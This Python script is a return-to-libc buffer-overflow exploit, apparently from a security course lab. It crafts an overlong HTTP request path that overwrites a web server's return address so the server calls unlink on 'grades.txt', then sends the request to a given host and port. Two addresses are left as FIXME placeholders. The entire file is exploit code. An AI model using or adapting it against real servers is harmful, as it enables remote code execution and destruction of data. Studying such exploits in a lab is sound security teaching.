#!/usr/bin/env python
import sys
import socket
import struct
import traceback
import urllib

reqpath = #FIXME
ebp     = #FIXME
unlink  = 0x8048970
beef    = 0xdeadbeef  		#try to use other hexdecimal
retaddr = ebp + 4
fname = "grades.txt"

def encode(p):
    return urllib.quote(struct.pack("I", p)) #replace special char in string using "%xx" escape

def build_exploit():
    req = ("GET " +
           "x" * (retaddr - reqpath) +    #fill x from reqpath to retaddr
           encode(unlink) +		  #%08%04%89%p
           encode(beef) +		  #%DE%AF%BE%EF
           encode(retaddr + 12) +	  #%FF%FF%DE%08 argument pointer
           fname +			  #"grades.txt" argument data
           " HTTP/1.0\r\n\r\n")
    return req

def send_req(host, port, req):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Connecting to %s:%d..." % (host, port))
    sock.connect((host, port))

    print("Connected, sending request...")
    sock.send(req)

    print("Request sent, waiting for reply...")
    rbuf = sock.recv(1024)
    resp = ""
    while len(rbuf):
        resp = resp + rbuf
        rbuf = sock.recv(1024)

    print("Received reply.")
    sock.close()
    return resp

if len(sys.argv) != 2:
    print("Usage: " + sys.argv[0] + " host:port")
    exit()
(host, port) = sys.argv[1].split(":")
port = int(port)

try:
    req = build_exploit()
    print("HTTP request:")
    print(req)

    resp = send_req(host, port, req)
    print("HTTP response:")
    print(resp)
except:
    print("Exception:")
    print(traceback.format_exc())
